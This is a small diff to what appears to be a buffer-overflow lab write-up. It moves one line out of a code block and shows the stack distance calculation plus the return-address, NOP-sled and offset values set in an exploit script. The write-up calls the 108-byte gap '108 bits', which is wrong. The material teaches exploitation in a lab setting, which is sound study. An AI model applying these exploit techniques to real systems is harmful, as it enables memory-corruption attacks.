@@ -94,8 +94,9 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> hex(0xffffcb28-0xffffcabc)
 '0x6c' or 108 bits apart in the stack. 
 ```
+In the exploit-32.py file we edit the following values 
+
 ```
-In the exploit file we edit the following values 
 start = 517-len(shellcode)   # start from len(shellcode) from the end of array
 ret = 0xffffcabc + 250       # return beyond ebp / NOP sled
 offset = 108 + 4             #ebp-&buffer+4
